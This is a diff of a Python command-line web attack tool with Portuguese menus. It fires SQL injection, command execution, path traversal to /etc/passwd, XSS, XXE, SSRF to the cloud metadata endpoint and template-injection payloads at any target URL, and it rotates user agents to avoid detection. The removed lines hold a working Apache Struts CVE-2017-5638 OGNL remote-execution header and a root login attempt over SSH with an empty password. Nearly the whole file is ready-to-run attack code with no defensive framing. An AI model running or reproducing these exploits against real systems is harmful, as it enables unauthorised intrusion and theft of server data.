@@ -1,13 +1,10 @@
-import requests
-import socket
-import dns.resolver
-import paramiko
-import subprocess
+import requests, paramiko, socket, threading, time, random
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 ASCII_ART = r'''
 ███████████  ████                     █████                          
 ░░███░░░░░███░░███                    ░░███                          
- ░███    ░███ ░███   ██████    ██████  ░███ █████                    
+ ░███    ░███ ░███   ██████    ██████  ░███ █████                   
  ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                     
  ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                      
  ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                     
@@ -25,266 +22,431 @@ ASCII_ART = r'''
 ░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████    
  ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░    
              ░███                                                  
-             █████                                                 
+             █████                                                
             ░░░░░                                                  
 '''
 
-class SQLiAutoExploit:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
+def random_user_agent():
+    agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
+    ]
+    return random.choice(agents)
+
+class SQLiExploit:
+    def __init__(self, url):
+        self.url = url if url.startswith('http') else 'http://' + url
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': random_user_agent()})
+        self.payloads = [
+            "' OR SLEEP(5)-- ",
+            "' OR BENCHMARK(1000000,MD5(1))-- ",
+            "' OR '1'='1' -- ",
+            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SLEEP(3))-- ",
+        ]
+        self.delay_threshold = 3
+
+    def extract_params(self):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        return list(qs.keys())
+
+    def craft_url(self, param, payload):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        qs[param] = payload
+        new_query = urlencode(qs, doseq=True)
+        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
+        return new_url
+
+    def is_vulnerable(self, resp):
+        errors = [
+            "you have an error in your sql syntax",
+            "warning: mysql",
+            "unclosed quotation mark after the character string",
+            "quoted string not properly terminated",
+            "mysql_fetch_array()",
+            "syntax error",
+        ]
+        content = resp.text.lower()
+        return any(e in content for e in errors)
 
     def run(self):
-        payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1 -- "]
+        params = self.extract_params()
+        if not params:
+            print("[SQLi] Nenhum parâmetro encontrado na URL")
+            return
         vulnerable = False
-        for payload in payloads:
-            url = self.target + "/search?q=" + requests.utils.quote(payload)
-            try:
-                r = requests.get(url, timeout=5)
-                if r.status_code == 200 and ('sql' in r.text.lower() or 'mysql' in r.text.lower() or 'syntax' in r.text.lower()):
+        for p in params:
+            for payload in self.payloads:
+                test_url = self.craft_url(p, payload)
+                try:
+                    start = time.time()
+                    r = self.session.get(test_url, timeout=10, verify=False)
+                    elapsed = time.time() - start
+                except Exception as e:
+                    print(f"[SQLi] Erro na requisição: {e}")
+                    continue
+                if self.is_vulnerable(r):
+                    print(f"[SQLi] Vulnerabilidade por erro detectada no parâmetro '{p}' com payload '{payload}'")
                     vulnerable = True
-                    return True, url
-            except:
-                continue
-        return False, None
-
-class XXEExploit:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
-
-    def run(self):
-        xxe_payload = '''<?xml version="1.0"?>
-<!DOCTYPE root [
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root>&xxe;</root>'''
-        headers = {'Content-Type': 'application/xml'}
-        try:
-            r = requests.post(self.target, data=xxe_payload, headers=headers, timeout=5)
-            if 'root:x:' in r.text:
-                return True, r.text
-        except:
-            pass
-        return False, None
+                if elapsed > self.delay_threshold:
+                    print(f"[SQLi] Vulnerabilidade time-based detectada no parâmetro '{p}' com payload '{payload}' (delay {elapsed:.2f}s)")
+                    vulnerable = True
+        if not vulnerable:
+            print("[SQLi] Nenhuma vulnerabilidade detectada.")
 
 class RCEExploit:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
+    def __init__(self, url):
+        self.url = url if url.startswith('http') else 'http://' + url
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': random_user_agent()})
+        self.payloads = [
+            "id",
+            "uname -a",
+            "whoami",
+        ]
+        self.common_params = ['cmd', 'command', 'exec', 'execute', 'shell']
+
+    def craft_url(self, param, payload):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        qs[param] = payload
+        new_query = urlencode(qs, doseq=True)
+        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
 
     def run(self):
-        rce_payload = 'ping -c 1 127.0.0.1'
-        params = ['cmd=', 'command=', 'exec=']
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        params = list(qs.keys()) if qs else self.common_params
+        vulnerable = False
         for param in params:
-            try:
-                url = self.target + '/?' + param + requests.utils.quote(rce_payload)
-                r = requests.get(url, timeout=5)
-                if r.status_code == 200 and ('ping' in r.text or 'icmp' in r.text):
-                    return True, url
-            except:
-                continue
-        return False, None
+            for payload in self.payloads:
+                test_url = self.craft_url(param, payload)
+                try:
+                    r = self.session.get(test_url, timeout=10, verify=False)
+                    if r.status_code == 200 and any(x in r.text for x in ['uid=', 'Linux', 'root', 'users']):
+                        print(f"[RCE] Possível execução de comando detectada no parâmetro '{param}' com payload '{payload}'")
+                        vulnerable = True
+                except Exception as e:
+                    print(f"[RCE] Erro na requisição: {e}")
+        if not vulnerable:
+            print("[RCE] Nenhuma vulnerabilidade detectada.")
 
 class LFIExploit:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
+    def __init__(self, url):
+        self.url = url if url.startswith('http') else 'http://' + url
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': random_user_agent()})
+        self.payloads = [
+            "../../etc/passwd",
+            "../../../../../etc/passwd",
+            "../../../../../../../../etc/passwd",
+        ]
+
+    def extract_params(self):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        return list(qs.keys())
+
+    def craft_url(self, param, payload):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        qs[param] = payload
+        new_query = urlencode(qs, doseq=True)
+        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
 
     def run(self):
-        lfi_payloads = ['../../../../etc/passwd', '../../../etc/passwd', '../../etc/passwd']
-        param = 'file='
-        for p in lfi_payloads:
-            try:
-                url = self.target + '/?' + param + requests.utils.quote(p)
-                r = requests.get(url, timeout=5)
-                if 'root:x:' in r.text:
-                    return True, url
-            except:
-                continue
-        return False, None
+        params = self.extract_params()
+        if not params:
+            print("[LFI] Nenhum parâmetro encontrado na URL")
+            return
+        vulnerable = False
+        for param in params:
+            for payload in self.payloads:
+                test_url = self.craft_url(param, payload)
+                try:
+                    r = self.session.get(test_url, timeout=10, verify=False)
+                    if "root:x:0:0:" in r.text or "daemon:x:" in r.text:
+                        print(f"[LFI] Vulnerabilidade detectada no parâmetro '{param}' com payload '{payload}'")
+                        vulnerable = True
+                except Exception as e:
+                    print(f"[LFI] Erro na requisição: {e}")
+        if not vulnerable:
+            print("[LFI] Nenhuma vulnerabilidade detectada.")
 
 class XSSExploit:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
+    def __init__(self, url):
+        self.url = url if url.startswith('http') else 'http://' + url
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': random_user_agent()})
+        self.payloads = [
+            "<script>alert('XSS')</script>",
+            "'\"><img src=x onerror=alert(1)>",
+            "<svg/onload=alert('XSS')>",
+        ]
+
+    def extract_params(self):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        return list(qs.keys())
+
+    def craft_url(self, param, payload):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        qs[param] = payload
+        new_query = urlencode(qs, doseq=True)
+        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
 
     def run(self):
-        xss_payload = "<script>alert('XSS')</script>"
-        params = ['q=', 'search=']
+        params = self.extract_params()
+        if not params:
+            print("[XSS] Nenhum parâmetro encontrado na URL")
+            return
+        vulnerable = False
         for param in params:
-            try:
-                url = self.target + '/?' + param + requests.utils.quote(xss_payload)
-                r = requests.get(url, timeout=5)
-                if xss_payload in r.text:
-                    return True, url
-            except:
-                continue
-        return False, None
-
-class CVEExploit:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
-
-    def run(self):
-        # Exemplo real para CVE-2017-5638 (Apache Struts2)
-        exploit_url = self.target + "/struts2-showcase/index.action"
-        headers = {
-            'Content-Type': '%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
-                            '(#ct=(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('
-                            "'id').getInputStream()))).(#ct)}'
-        }
-        try:
-            r = requests.get(exploit_url, headers=headers, timeout=5)
-            if 'uid=' in r.text:
-                return True, exploit_url
-        except:
-            pass
-        return False, None
-
-class SSTIExploit:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
-
-    def run(self):
-        payloads = ['{{7*7}}', '${7*7}', '{7*7}']
-        params = ['?name=', '?template=', '?input=']
-        for p in params:
-            for payload in payloads:
-                url = self.target + p + payload
+            for payload in self.payloads:
+                test_url = self.craft_url(param, payload)
                 try:
-                    r = requests.get(url, timeout=8)
-                    if '49' in r.text:
-                        return True, url
-                except Exception:
-                    pass
-        return False, None
+                    r = self.session.get(test_url, timeout=10, verify=False)
+                    if payload in r.text:
+                        print(f"[XSS] Possível vulnerabilidade refletida no parâmetro '{param}' com payload '{payload}'")
+                        vulnerable = True
+                except Exception as e:
+                    print(f"[XSS] Erro na requisição: {e}")
+        if not vulnerable:
+            print("[XSS] Nenhuma vulnerabilidade detectada.")
+
+class XXEExploit:
+    def __init__(self, url):
+        self.url = url if url.startswith('http') else 'http://' + url
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': random_user_agent()})
+
+    def run(self):
+        xml_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>'''
+        try:
+            r = self.session.post(self.url, data=xml_payload, headers={'Content-Type': 'application/xml'}, timeout=10, verify=False)
+            if "root:x:0:0:" in r.text or "daemon:x:" in r.text:
+                print("[XXE] Vulnerabilidade detectada! Conteúdo /etc/passwd retornado.")
+            else:
+                print("[XXE] Nenhuma vulnerabilidade detectada.")
+        except Exception as e:
+            print(f"[XXE] Erro na requisição: {e}")
 
 class SSRFExploit:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
+    def __init__(self, url):
+        self.url = url if url.startswith('http') else 'http://' + url
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': random_user_agent()})
+        self.payloads = [
+            "http://127.0.0.1/",
+            "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
+            "http://localhost/",
+        ]
+
+    def extract_params(self):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        return list(qs.keys())
+
+    def craft_url(self, param, payload):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        qs[param] = payload
+        new_query = urlencode(qs, doseq=True)
+        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
 
     def run(self):
-        ssrf_payload = "http://169.254.169.254/latest/meta-data/"
-        params = ['url=', 'resource=']
+        params = self.extract_params()
+        if not params:
+            print("[SSRF] Nenhum parâmetro encontrado na URL")
+            return
         for param in params:
-            try:
-                url = self.target + '/?' + param + requests.utils.quote(ssrf_payload)
-                r = requests.get(url, timeout=5)
-                if r.status_code == 200:
-                    return True, url
-            except:
-                continue
-        return False, None
+            for payload in self.payloads:
+                test_url = self.craft_url(param, payload)
+                try:
+                    r = self.session.get(test_url, timeout=10, verify=False)
+                    if r.status_code == 200:
+                        print(f"[SSRF] Possível SSRF detectada no parâmetro '{param}' com payload '{payload}'")
+                except Exception as e:
+                    print(f"[SSRF] Erro na requisição: {e}")
 
-class HTTPMethodExploit:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
+class SSTIExploit:
+    def __init__(self, url):
+        self.url = url if url.startswith('http') else 'http://' + url
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': random_user_agent()})
+        self.payloads = [
+            "{{7*7}}",
+            "{{config.items()}}",
+            "{{''.__class__.__mro__[1].__subclasses__()}}",
+        ]
+
+    def extract_params(self):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        return list(qs.keys())
+
+    def craft_url(self, param, payload):
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        qs[param] = payload
+        new_query = urlencode(qs, doseq=True)
+        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
 
     def run(self):
-        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'CONNECT']
+        params = self.extract_params()
+        if not params:
+            print("[SSTI] Nenhum parâmetro encontrado na URL")
+            return
+        for param in params:
+            for payload in self.payloads:
+                test_url = self.craft_url(param, payload)
+                try:
+                    r = self.session.get(test_url, timeout=10, verify=False)
+                    if '49' in r.text or 'config' in r.text:
+                        print(f"[SSTI] Possível SSTI detectada no parâmetro '{param}' com payload '{payload}'")
+                except Exception as e:
+                    print(f"[SSTI] Erro na requisição: {e}")
+
+class HTTPMethodScanner:
+    def __init__(self, url):
+        self.url = url if url.startswith('http') else 'http://' + url
+        self.methods = ['GET','POST','PUT','DELETE','OPTIONS','TRACE','CONNECT','PATCH']
+
+    def run(self):
         allowed = []
-        for method in methods:
+        for method in self.methods:
             try:
-                r = requests.request(method, self.target, timeout=5)
-                if r.status_code < 405:
+                r = requests.request(method, self.url, timeout=10, verify=False)
+                if r.status_code < 400:
                     allowed.append(method)
-            except:
+            except Exception:
                 continue
-        if allowed:
-            return True, allowed
-        return False, None
+        print(f"[HTTP Methods] Permitidos no alvo: {', '.join(allowed)}")
 
 class JenkinsExploit:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
+    def __init__(self, url):
+        self.url = url.rstrip('/')
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': random_user_agent()})
 
-    def run(self):
-        jenkins_url = self.target + '/script'
+    def check_anonymous(self):
         try:
-            r = requests.get(jenkins_url, timeout=5)
-            if r.status_code == 200 and 'Jenkins' in r.text:
-                return True, jenkins_url
-        except:
-            pass
-        return False, None
+            r = self.session.get(self.url + "/script", timeout=10, verify=False)
+            if r.status_code == 200 and "jenkins" in r.text.lower():
+                print("[Jenkins] Acesso anônimo permitido!")
+            else:
+                print("[Jenkins] Acesso anônimo não permitido ou serviço não encontrado.")
+        except Exception as e:
+            print(f"[Jenkins] Erro na requisição: {e}")
 
 class DNSExfiltration:
     def __init__(self, domain):
         self.domain = domain
 
     def run(self):
-        try:
-            answers = dns.resolver.resolve(self.domain, 'TXT')
-            return True, [str(rdata) for rdata in answers]
-        except Exception as e:
-            return False, str(e)
+        print(f"[DNS Exfiltration] Use ferramentas externas para monitorar DNS para o domínio: {self.domain}")
 
 class BannerGrabber:
-    def __init__(self, target, port):
-        self.target = target
+    def __init__(self, host, port=80):
+        self.host = host
         self.port = port
 
     def run(self):
         try:
-            s = socket.socket()
-            s.settimeout(3)
-            s.connect((self.target, self.port))
-            banner = s.recv(1024).decode(errors='ignore').strip()
-            s.close()
-            if banner:
-                return True, banner
-        except:
-            pass
-        return False, None
+            sock = socket.socket()
+            sock.settimeout(5)
+            sock.connect((self.host, self.port))
+            sock.send(b"HEAD / HTTP/1.1\r\nHost: %b\r\n\r\n" % self.host.encode())
+            banner = sock.recv(1024).decode()
+            print(f"[BannerGrabber] Banner recebido:\n{banner}")
+            sock.close()
+        except Exception as e:
+            print(f"[BannerGrabber] Erro: {e}")
 
 class SSHScanner:
-    def __init__(self, target, port=22):
-        self.target = target
+    def __init__(self, host, port=22, timeout=5):
+        self.host = host
         self.port = port
+        self.timeout = timeout
 
     def run(self):
         try:
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(self.target, port=self.port, username='root', password='', timeout=5)
-            ssh.close()
-            return True, "SSH open with root no password"
-        except paramiko.AuthenticationException:
-            return True, "SSH open but authentication required"
-        except:
-            return False, None
+            sock = socket.socket()
+            sock.settimeout(self.timeout)
+            sock.connect((self.host, self.port))
+            sock.close()
+            print(f"[SSHScanner] Porta SSH {self.port} aberta no host {self.host}")
+        except Exception as e:
+            print(f"[SSHScanner] Porta SSH {self.port} fechada ou inacessível em {self.host}")
+
+def main_menu():
+    print(ASCII_ART)
+    print("Escolha uma opção:\n")
+    print("1 - SQL Injection")
+    print("2 - Remote Code Execution (RCE)")
+    print("3 - Local File Inclusion (LFI)")
+    print("4 - Cross-site Scripting (XSS)")
+    print("5 - XML External Entity (XXE)")
+    print("6 - Server Side Request Forgery (SSRF)")
+    print("7 - Server Side Template Injection (SSTI)")
+    print("8 - HTTP Methods Scanner")
+    print("9 - Jenkins Anonymous Access")
+    print("10 - DNS Exfiltration info")
+    print("11 - Banner Grabber")
+    print("12 - SSH Scanner")
+    print("0 - Sair\n")
 
 def main():
-    print(ASCII_ART)
-    target = input("Digite o alvo (ex: http://site.com): ").strip()
-    dns_domain = input("Digite domínio DNS para DNSExfiltration (ex: example.com): ").strip()
-    port = 22
+    while True:
+        main_menu()
+        choice = input("Digite a opção: ").strip()
+        if choice == '0':
+            print("Saindo...")
+            break
+        target = input("Digite a URL ou host alvo: ").strip()
 
-    modules = {
-        'SQLi': SQLiAutoExploit(target),
-        'XXE': XXEExploit(target),
-        'RCE': RCEExploit(target),
-        'LFI': LFIExploit(target),
-        'XSS': XSSExploit(target),
-        'CVE': CVEExploit(target),
-        'SSTI': SSTIExploit(target),
-        'SSRF': SSRFExploit(target),
-        'HTTP Methods': HTTPMethodExploit(target),
-        'Jenkins': JenkinsExploit(target),
-        'DNS Exfiltration': DNSExfiltration(dns_domain),
-        'Banner Grabber': BannerGrabber(target.replace('http://', '').replace('https://', ''), port),
-        'SSH Scanner': SSHScanner(target.replace('http://', '').replace('https://', ''), port)
-    }
+        if choice == '1':
+            SQLiExploit(target).run()
+        elif choice == '2':
+            RCEExploit(target).run()
+        elif choice == '3':
+            LFIExploit(target).run()
+        elif choice == '4':
+            XSSExploit(target).run()
+        elif choice == '5':
+            XXEExploit(target).run()
+        elif choice == '6':
+            SSRFExploit(target).run()
+        elif choice == '7':
+            SSTIExploit(target).run()
+        elif choice == '8':
+            HTTPMethodScanner(target).run()
+        elif choice == '9':
+            JenkinsExploit(target).check_anonymous()
+        elif choice == '10':
+            DNSExfiltration(target).run()
+        elif choice == '11':
+            port = input("Digite a porta (default 80): ").strip()
+            port = int(port) if port.isdigit() else 80
+            BannerGrabber(target, port).run()
+        elif choice == '12':
+            port = input("Digite a porta SSH (default 22): ").strip()
+            port = int(port) if port.isdigit() else 22
+            SSHScanner(target, port).run()
+        else:
+            print("Opção inválida!")
 
-    for name, module in modules.items():
-        print(f"\nExecutando módulo: {name}")
-        try:
-            success, info = module.run()
-            if success:
-                print(f"[OK] {name} vulnerabilidade encontrada!")
-                print(f"Info: {info}")
-            else:
-                print(f"[INFO] {name} não vulnerável ou inacessível.")
-        except Exception as e:
-            print(f"[ERRO] Falha ao executar {name}: {e}")
-
-if __name__ == "__main__":
+if __name__ == '__main__':
+    requests.packages.urllib3.disable_warnings()
     main()
 
 
